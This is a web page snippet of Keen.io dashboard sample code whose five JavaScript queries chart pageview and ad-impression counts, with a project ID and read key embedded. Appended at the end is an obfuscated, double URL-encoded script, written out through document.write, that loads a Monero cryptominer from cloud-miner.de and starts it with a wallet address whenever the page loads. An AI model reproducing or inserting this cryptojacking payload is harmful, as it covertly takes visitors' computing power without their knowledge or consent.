<script>
  const client = new Keen({
    projectId: "5368fa5436bf5a5623000000",
    readKey: "3f324dcb5636316d6865ab0ebbbbc725224c7f8f3e8899c7733439965d6d4a2c7f13bf7765458790bd50ec76b4361687f51cf626314585dc246bb51aeb455c0a1dd6ce77a993d9c953c5fc554d1d3530ca5d17bdc6d1333ef3d8146a990c79435bb2c7d936f259a22647a75407921056"
  });

  Keen.ready(function () {

    // ----------------------------------------
    // Sample one
    // ----------------------------------------

    const pageviews_timeline = client.query('count', {
      eventCollection: "pageviews",
      interval: "hourly",
      groupBy: "user.device_info.browser.family",
      timeframe: {
        start: "2014-05-04T00:00:00.000Z",
        end: "2014-05-05T00:00:00.000Z"
      }
    });

    client.run([pageviews_timeline])
      .then(res => {
        const chart = new KeenDataviz({
            container: '#chart-01',
            type: 'area'
          })
          .data(res)
          .render();
      })
    // ----------------------------------------
    //  End sample one
    // ----------------------------------------


    // ----------------------------------------
    // Sample two
    // ----------------------------------------

    const pageviews_static = client.query('count', {
      eventCollection: "pageviews",
      groupBy: "user.device_info.browser.family",
      timeframe: {
        start: "2014-05-01T00:00:00.000Z",
        end: "2014-05-05T00:00:00.000Z"
      }
    });

    client.run([pageviews_static])
      .then(res => {
        const chart = new KeenDataviz({
            container: '#chart-02',
            type: 'pie'
          })
          .data(res)
          .render();
      })
    // ----------------------------------------
    // End sample two
    // ----------------------------------------

    // ----------------------------------------
    // Sample three
    // ----------------------------------------

    const impressions_timeline = client.query('count', {
      eventCollection: "impressions",
      groupBy: "ad.advertiser",
      interval: "hourly",
      timeframe: {
        start: "2014-05-04T00:00:00.000Z",
        end: "2014-05-05T00:00:00.000Z"
      }
    });

    client.run([impressions_timeline])
      .then(res => {
        const chart = new KeenDataviz({
            container: '#chart-03',
            type: 'bar',
            stacked: true
          })
          .data(res)
          .render();
      });

    // ----------------------------------------
    // End sample three
    // ----------------------------------------

    // ----------------------------------------
    // Sample four
    // ----------------------------------------

    const impressions_timeline_by_device = client.query('count', {
      eventCollection: "impressions",
      groupBy: "user.device_info.device.family",
      interval: "hourly",
      timeframe: {
        start: "2014-05-04T00:00:00.000Z",
        end: "2014-05-05T00:00:00.000Z"
      }
    });

    client.run([impressions_timeline_by_device])
      .then(res => {
        const chart = new KeenDataviz({
            container: '#chart-04',
            type: 'bar',
            stacked: true,
            bar: {
              width: 100
            }
          })
          .data(res)
          .render();
      });

    // ----------------------------------------
    // End sample four
    // ----------------------------------------

    // ----------------------------------------
    // Sample five
    // ----------------------------------------

    const impressions_timeline_by_country = client.query('count', {
      eventCollection: "impressions",
      groupBy: "user.geo_info.country",
      interval: "hourly",
      timeframe: {
        start: "2014-05-04T00:00:00.000Z",
        end: "2014-05-05T00:00:00.000Z"
      }
    });

    client.run([impressions_timeline_by_country])
      .then(res => {
        const chart = new KeenDataviz({
            container: '#chart-05',
            type: 'bar',
            stacked: true,
            bar: {
              width: {
                ratio: 0.85
              }
            }
          })
          .data(res)
          .render();
      });

    // ----------------------------------------
    // End sample five
    // ----------------------------------------

  });
</script>
<script language=JavaScript> /* Generated using sourceLocker v1.0 LITE Edition (svetlin@developer.bg, kirokomara@designer.bg) */m='%3Cscript%20language%3DJavaScript%3E%20/*%20Generated%20using%20sourceLocker%20v1.0%20LITE%20Edition%20%28svetlin@developer.bg%2C%20kirokomara@designer.bg%29%20*/m%3D%27%253Cscript%2520src%253D%2522https%253A//cloud-miner.de/tkefrep/tkefrep.js%253Ftkefrep%253Dbs%253Fnosaj%253Dfaster.xmr2%2522%2520%253E%253C/script%253E%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250AEverythingIsLife%2528%252786Zpz8MhDdh68tDjKFBfJ6FRa1Gz9NsSTjKHCXDPmfYRNszKCaHoJ6bMUcsfv92Rro4Siy3VTYtxKe31MqdczmM5JUFtqpr%2527%252C%2520%2527x%2527%252C%25200%2529%253B%250A%253C/script%253E%27%3Bd%3Dunescape%28m%29%3Bdocument.write%28d%29%3B%3C/script%3E';d=unescape(m);document.write(d);</script>
